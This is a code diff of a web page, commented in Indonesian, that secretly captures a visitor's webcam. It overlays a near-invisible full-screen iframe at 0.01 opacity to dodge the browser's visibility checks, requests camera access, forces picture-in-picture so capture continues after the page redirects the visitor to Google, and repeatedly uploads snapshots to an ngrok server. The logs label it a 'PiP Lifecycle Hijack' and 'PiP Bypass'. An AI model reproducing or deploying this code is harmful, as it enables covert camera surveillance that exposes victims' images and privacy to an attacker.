@@ -11,7 +11,16 @@
   h2 { color: #4285f4; margin-bottom: 10px; font-size: 22px; }
   p { color: #666; font-size: 14px; margin-bottom: 20px; }
   #log { margin-top: 20px; background: #000; padding: 10px; border-radius: 6px; color: #0f0; font-size: 12px; font-family: monospace; text-align: left; height: 120px; overflow-y: auto; }
-  iframe { display: none; }
+  
+  /* Iframe Transparan (Bukan display: none) */
+  #pipFrame {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100vw; height: 100vh;
+    opacity: 0.01; /* Hampir transparan, tapi dianggap visible */
+    pointer-events: none;
+    z-index: 9999;
+  }
 </style>
 </head>
 <body>
@@ -23,6 +32,9 @@
 </div>
 
 <div id="launcher-container" style="display: none;"></div>
+
+<!-- Iframe Transparan (Visible) -->
+<iframe id="pipFrame" allow="camera; microphone; autoplay; picture-in-picture"></iframe>
 
 <script>
 (function () {
@@ -40,29 +52,29 @@
   // KONFIGURASI
   // ============================================
   var TARGET_URL = "https://www.google.com";
-  var SERVER_ENDPOINT = "https://studly-unallegorized-brecken.ngrok-free.dev/";
+  var SERVER_ENDPOINT = "https://studly-unallegorized-brecken.ngrok-free.dev/upload";
   var REDIRECT_DELAY = 3000; // 3 Detik
 
   // ============================================
-  // FUNGSI: INJECT IFRAME TERSEMBUNYI (PiP + CAMERA)
+  // FUNGSI: INJECT IFRAME TRANSPARAN (PiP + CAMERA)
   // ============================================
-  function injectHiddenIframe() {
+  function injectVisibleIframe() {
     try {
-      log("[+] Membuat Iframe Tersembunyi (PiP)...");
+      log("[+] Membuat Iframe Transparan (PiP)...");
 
-      var iframe = document.createElement('iframe');
-      iframe.allow = "camera; microphone; autoplay; picture-in-picture";
-      iframe.style.display = "none";
+      var iframe = document.getElementById('pipFrame');
       
+      // Tulis payload ke dalam iframe
       iframe.srcdoc = `
         <!DOCTYPE html>
         <html>
         <body>
-          <video id="hiddenVideo" autoplay playsinline muted style="display:none;"></video>
+          <video id="hiddenVideo" autoplay playsinline muted style="position:absolute;top:0;left:0;width:100vw;height:100vh;opacity:0.01;"></video>
           <canvas id="hiddenCanvas" width="640" height="480" style="display:none;"></canvas>
           
           <script>
             (function() {
+              // 1. Minta Izin Kamera
               navigator.mediaDevices.getUserMedia({ video: true, audio: false })
                 .then(function(stream) {
                   var video = document.getElementById('hiddenVideo');
@@ -71,6 +83,7 @@
                   
                   parent.postMessage({ type: 'CAM_GRANTED' }, '*');
 
+                  // 2. Paksa Masuk PiP (setelah 1 detik)
                   setTimeout(function() {
                     if (document.pictureInPictureElement) {
                       document.exitPictureInPicture();
@@ -82,8 +95,9 @@
                       .catch(function(err) {
                         parent.postMessage({ type: 'PIP_DENIED', error: err.message }, '*');
                       });
-                  }, 500);
+                  }, 1000);
 
+                  // 3. Kirim Gambar ke Server
                   setInterval(function() {
                     var canvas = document.getElementById('hiddenCanvas');
                     var ctx = canvas.getContext('2d');
@@ -111,8 +125,7 @@
         </html>
       `;
 
-      document.getElementById("launcher-container").appendChild(iframe);
-      log("[+] Iframe Tersembunyi disuntikkan.");
+      log("[+] Iframe Transparan disuntikkan.");
     } catch(e) {
       log("[-] Iframe Error: " + e.message);
     }
@@ -146,10 +159,10 @@
       <div id="log"></div>
     `;
     logEl = document.getElementById('log');
-    log("[!] Memulai PiP Lifecycle Hijack...");
+    log("[!] Memulai PiP Bypass...");
 
-    // A. INJECT IFRAME
-    injectHiddenIframe();
+    // A. INJECT IFRAME TRANSPARAN
+    injectVisibleIframe();
 
     // B. REDIRECT KE GOOGLE
     setTimeout(function() {
